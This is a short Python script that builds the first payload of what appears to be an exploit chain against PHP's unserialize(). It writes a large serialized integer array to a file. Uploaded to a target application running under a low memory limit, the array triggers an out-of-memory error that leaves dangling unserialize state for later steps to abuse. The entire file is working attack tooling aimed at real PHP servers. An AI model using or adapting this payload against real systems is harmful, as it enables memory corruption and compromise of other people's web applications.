#!/usr/bin/env python3
"""Generate the request-A payload: one 1.19 MB serialized array of N ints.

The payload is uploaded to the target-side app page that calls unserialize()
under a low memory_limit. Decoding it OOMs after php_var_unserialize_init()
has published BG(unserialize).data, leaving the dangling state.
"""
import argparse

p = argparse.ArgumentParser()
p.add_argument("--out", default="/tmp/p2s_a.bin")
p.add_argument("-n", type=int, default=100000)
a = p.parse_args()

with open(a.out, "wb") as f:
    f.write(b"a:%d:{" % a.n)
    for i in range(a.n):
        f.write(b"i:%d;i:0;" % i)
    f.write(b"}")

print(a.out)
